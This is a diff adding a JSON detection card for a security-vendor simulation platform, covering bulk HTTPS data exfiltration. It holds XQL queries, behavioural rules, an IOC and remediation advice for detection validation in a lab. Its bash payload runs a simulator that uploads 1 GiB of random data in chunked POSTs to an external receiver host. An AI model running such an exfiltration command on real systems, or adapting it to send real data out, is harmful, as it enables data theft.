@@ -1,0 +1,324 @@
+{
+  "id": "TTP-2026-0068",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-06-08T00:00:00+00:00",
+    "updated_at": "2026-06-08",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-ndr",
+      "vector-exfiltration",
+      "protocol-https",
+      "industry-all",
+      "severity-high",
+      "network"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42",
+      "SRC-DFIR-REPORT"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "network",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux",
+        "network-fabric"
+      ],
+      "estimated_runtime_seconds": 600,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Bulk HTTPS Exfiltration — Sustained Outbound Bytes Exceeding Host Baseline (T1041 / T1567)",
+    "summary": "A non-server endpoint streams gigabytes outbound across a few long-lived HTTPS sessions to one external destination. The CortexSim bulk_https_exfil EAL plugin reproduces the shape against an authorised receiver: high bytes-out per session, an upload-skewed ratio, and multi-minute duration. NGFW EAL + XSIAM Network Security Analytics flag the volume and duration anomaly versus the host baseline.",
+    "description": "Volumetric data exfiltration over HTTPS is the dominant actions-on-objectives shape in modern double-extortion intrusions: the operator stages collected data then pushes it to attacker-controlled cloud storage or a drop server over TLS so the payload is opaque to inspection. The detectable surface is therefore not content but flow shape — a single internal source sustaining a very large outbound byte count to one external destination, with a bytes-out/bytes-in ratio far above any browsing baseline, across a session (or small set of chunked sessions) that stays open for minutes rather than seconds. This card detects the exfiltration purely from NGFW flow telemetry in panw_ngfw_traffic_raw / network_story: (1) a BIOC for total outbound bytes per source/destination greatly exceeding the host baseline within a time bin; (2) a BIOC for the long-lived, upload-skewed HTTPS session; (3) an IOC on the authorised lab receiver host so a DC can isolate the simulated egress during a POV; and (4) a correlation rule that stitches the NGFW session-volume anomaly with the originating XDR process so the SOC sees a single exfiltration incident with end-to-end causality rather than an isolated traffic spike. The bulk_https_exfil plugin charges a campaign-level cumulative byte budget and stamps every request with the operator telemetry headers, so the simulated transfer is bounded, attributable, and safe to replay in a customer lab.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [
+      "Double-Extortion Pre-Encryption Exfiltration"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "technology"
+    ],
+    "first_observed": "2020-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1567",
+        "name": "Exfiltration Over Web Service",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Flow",
+      "Network Traffic: Network Traffic Content"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "T1041 — CortexSim bulk_https_exfil EAL plugin (chunked large outbound HTTPS POST to authorised receiver)",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Lab environment matching scenario SIM-NDR-005 requirements (NGFW inline forwarding outbound traffic logs to XSIAM; egress to the operator-supplied receiver host permitted).",
+        "check_command": "python3 -m scripts.eal_simulator.cli describe bulk_https_exfil"
+      },
+      {
+        "description": "NGFW forwards Enhanced Application Logs / traffic logs into XSIAM (panw_ngfw_traffic_raw / network_story carries app, src_ip, dst_ip, action_total_upload, action_total_download, session duration)."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# Live bulk HTTPS exfil: stream 1 GiB random payload across 4 chunked POSTs to the authorised receiver.\ncat > /tmp/bulk-exfil-live.yml <<'YML'\ncampaign_id: CMP-NDR-005\nname: \"NDR validation — bulk HTTPS exfil\"\nauthorized_by: \"domain-consultant@paloaltonetworks.com\"\nsimulation_authorized: true\ntarget_allowlist:\n  - testmynids.org\ndry_run: false\ntags: [ndr, exfil, eal, https]\nsteps:\n  - step_id: step-01\n    plugin: bulk_https_exfil\n    params:\n      target_url: https://exfil-receiver.testmynids.org/upload\n      total_bytes: 1073741824    # 1 GiB\n      chunk_bytes: 4194304       # 4 MiB\n      request_count: 4\n      method: POST\n      request_timeout: 600\nYML\npython3 -m scripts.eal_simulator.cli run /tmp/bulk-exfil-live.yml --live",
+      "input_variables": [],
+      "timeout_seconds": 600
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "Sustained outbound HTTPS sessions from one source to a single external destination carrying a very large total upload byte count within the run window.",
+        "expected_value": "app IN (\"ssl\",\"web-browsing\") AND action_total_upload > 250000000"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Heavily upload-skewed flow — bytes-out far exceeds bytes-in for the session, atypical of normal browsing.",
+        "expected_value": "action_total_upload / (action_total_download + 1) > 10"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Long-lived HTTPS session(s) lasting minutes rather than seconds during the transfer.",
+        "expected_value": "session_duration > 120"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Operator header X-Simulation-Run-ID present on every simulated request for POV filtering.",
+        "expected_value": "http_req_headers CONTAINS \"X-Simulation-Run-ID\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -f /tmp/bulk-exfil-live.yml\necho '[CortexSim] SIM-NDR-005 cleanup complete'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "domain",
+        "value": "exfil-receiver.testmynids.org",
+        "context": "Authorised lab exfil receiver host. Not malicious on its own — lets the DC isolate the simulated bulk-HTTPS egress in panw_ngfw_traffic_raw during a POV. In a real environment substitute the customer-observed attacker-controlled drop host."
+      }
+    ],
+    "biocs": [
+      {
+        "name": "NGFW EAL outbound bytes per session greatly exceeds host baseline",
+        "description": "Single internal source sustains a very large total outbound byte count to one external destination within a time bin, far above the host's browsing baseline — the volumetric exfiltration signature.",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter app in (\"ssl\", \"web-browsing\", \"web-browsing-ssl\")\n| filter action = \"allow\"\n| filter dst_ip != null and not incidr(dst_ip, \"10.0.0.0/8\") and not incidr(dst_ip, \"172.16.0.0/12\") and not incidr(dst_ip, \"192.168.0.0/16\")\n| bin _time span = 5m\n| comp sum(action_total_upload) as bytes_out, sum(action_total_download) as bytes_in, count() as sessions by src_ip, dst_ip, dst_host, _time\n| filter bytes_out > 250000000 and (bytes_out / (bytes_in + 1)) > 10\n| fields _time, src_ip, dst_ip, dst_host, sessions, bytes_out, bytes_in",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1041",
+          "T1567"
+        ]
+      },
+      {
+        "name": "NGFW EAL long-lived upload-skewed HTTPS session",
+        "description": "Outbound HTTPS session that stays open for minutes with a heavily upload-skewed byte ratio — a single chunked transfer rather than interactive browsing.",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter app in (\"ssl\", \"web-browsing\", \"web-browsing-ssl\")\n| filter action = \"allow\"\n| filter session_duration > 120\n| filter action_total_upload > 50000000 and (action_total_upload / (action_total_download + 1)) > 10\n| comp count() as long_sessions, max(session_duration) as max_duration, sum(action_total_upload) as bytes_out by src_ip, dst_ip, dst_host\n| filter long_sessions >= 1\n| fields src_ip, dst_ip, dst_host, long_sessions, max_duration, bytes_out",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1041"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Pre-flight bulk-exfil receiver reachable over HTTPS",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 1800)\n| filter app in (\"ssl\", \"web-browsing\", \"web-browsing-ssl\")\n| filter dst_host = \"exfil-receiver.testmynids.org\"\n| comp count() as sessions by src_ip, dst_host\n| fields src_ip, dst_host, sessions",
+        "expected_rows_min": 0,
+        "dataset": "panw_ngfw_traffic_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "NGFW EAL large sustained outbound bytes to single destination",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 1800)\n| filter app in (\"ssl\", \"web-browsing\", \"web-browsing-ssl\")\n| filter action = \"allow\"\n| comp sum(action_total_upload) as bytes_out, sum(action_total_download) as bytes_in, count() as sessions by src_ip, dst_ip, dst_host\n| filter bytes_out > 500000000 and (bytes_out / (bytes_in + 1)) > 10\n| sort desc bytes_out\n| fields src_ip, dst_ip, dst_host, sessions, bytes_out, bytes_in",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "NGFW EAL long-lived upload-skewed HTTPS session present",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 1800)\n| filter app in (\"ssl\", \"web-browsing\", \"web-browsing-ssl\")\n| filter session_duration > 120\n| filter action_total_upload > 50000000\n| comp max(session_duration) as max_duration, sum(action_total_upload) as bytes_out by src_ip, dst_ip, dst_host\n| filter max_duration > 120\n| fields src_ip, dst_ip, dst_host, max_duration, bytes_out",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      },
+      {
+        "purpose": "validation",
+        "name": "Operator filter bulk-exfil simulation header isolates run",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 1800)\n| filter app in (\"ssl\", \"web-browsing\", \"web-browsing-ssl\")\n| filter http_req_headers contains \"X-Simulation-Run-ID\"\n| filter dst_host = \"exfil-receiver.testmynids.org\"\n| comp sum(action_total_upload) as bytes_out by src_ip, dst_host\n| fields src_ip, dst_host, bytes_out",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Bulk HTTPS Exfil Cross-Plane Stitch — NGFW Volume Anomaly Plus XDR Originating Process",
+        "rule_id": "CR-NDR-0008",
+        "logic": "BIOC(NGFW EAL outbound bytes per session greatly exceeds host baseline) AND (XQL(NGFW EAL large sustained outbound bytes to single destination) OR XDR(originating process on src_host)) on same src_host within 30m"
+      }
+    ],
+    "analytics_modules": [
+      "Cortex XSIAM Network Security Analytics — Anomalous Outbound Data Volume",
+      "Cortex XSIAM Analytics — Long-Lived Upload-Skewed Session Scoring",
+      "Cortex XSIAM Causality — Exfiltration Session Stitched to Originating Process"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "ngfw-pa-series",
+        "submodule": "app-id-enhanced-application-log",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "NGFW-EAL-HTTPS-BULK-EGRESS-001"
+        ],
+        "license_required": "pro",
+        "evidence_query": "dataset = panw_ngfw_traffic_raw | filter app in (\"ssl\",\"web-browsing\") | comp sum(action_total_upload) as bytes_out by src_ip, dst_ip, dst_host | filter bytes_out > 500000000"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "network-security-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-AN-EXFIL-VOLUME-HTTPS",
+          "XSIAM-CR-NDR-0008"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "preset = network_story | filter app in (\"ssl\",\"web-browsing\") | comp sum(action_total_upload) as bytes_out by src_ip, dst_ip | filter bytes_out > 500000000"
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "response",
+        "rule_ids": [
+          "XSOAR-PB-BulkExfilResponse-v1"
+        ],
+        "license_required": "base",
+        "evidence_query": "Playbook: block the outbound destination at the NGFW, isolate the source host, snapshot file-server access logs for the source, open a data-exfiltration DFIR ticket."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-EXFIL-064",
+        "name": "Anomalous Outbound Bytes Detection via NGFW EAL",
+        "description": "Validate that NGFW EAL + XSIAM Network Security Analytics detect sustained bulk HTTPS upload exceeding the host baseline and stitch the session-volume anomaly to the originating process.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-EXFIL-064A",
+            "objective": "Sustained large outbound byte volume to a single destination is surfaced by Network Security Analytics.",
+            "preconditions": [
+              "NGFW inline forwarding outbound traffic logs to XSIAM.",
+              "Egress to the operator-supplied receiver host permitted for the simulator host."
+            ],
+            "steps": [
+              "Run SIM-NDR-005 step-02 (live bulk_https_exfil, 1 GiB across 4 chunked POSTs).",
+              "Inspect Network Security Analytics / network_story for the source IP."
+            ],
+            "success_criteria": [
+              "XQL `NGFW EAL large sustained outbound bytes to single destination` returns >= 1 row with bytes_out > 500 MB.",
+              "BIOC `NGFW EAL outbound bytes per session greatly exceeds host baseline` matches the source."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "test_case_id": "TC-EXFIL-064B",
+            "objective": "Long-lived upload-skewed session and originating process stitch into one exfiltration incident.",
+            "success_criteria": [
+              "BIOC `NGFW EAL long-lived upload-skewed HTTPS session` returns >= 1 row with max_duration > 120s.",
+              "Correlation `CR-NDR-0008` raises a single data-exfiltration incident for the source with the originating process in the causality chain."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Enforce a default-deny egress policy; allow large outbound transfers only from sanctioned file-transfer hosts to approved destinations.",
+      "Apply DLP on outbound HTTPS to detect and block sensitive content leaving the environment.",
+      "Require an authenticated egress proxy for all outbound web traffic so volumetric uploads are attributable and policy-controlled."
+    ],
+    "detection_engineering": [
+      "Baseline per-host outbound byte volume and per-destination cardinality; alert on hosts crossing N GB/hour outbound or far above their own baseline.",
+      "Score long-lived, upload-skewed HTTPS sessions to a single destination distinctly from interactive browsing.",
+      "Correlate the NGFW session-volume anomaly with the originating XDR process so the SOC investigates one exfiltration incident rather than a raw traffic spike."
+    ],
+    "response_playbook": "XSOAR-PB-BulkExfilResponse-v1"
+  },
+  "references": [
+    {
+      "title": "Unit42 - APT Exfiltration via Cloud Storage and Drop Servers",
+      "url": "https://unit42.paloaltonetworks.com/",
+      "publisher": "Unit42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1041 — Exfiltration Over C2 Channel",
+      "url": "https://attack.mitre.org/techniques/T1041/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "The DFIR Report — Data Exfiltration case studies",
+      "url": "https://thedfirreport.com/?s=exfiltration",
+      "publisher": "The DFIR Report",
+      "publisher_id": "SRC-DFIR-REPORT"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-06-08",
+      "author": "Henry Reed",
+      "change": "Initial entry — dedicated TTP card for SIM-NDR-005 (bulk HTTPS exfil). Real NGFW EAL volumetric-egress BIOC/XQL/IOC, correlation CR-NDR-0008 stitching the NGFW volume anomaly to the originating XDR process. Closes PLANE-NDR-005-NOCARD."
+    }
+  ]
+}
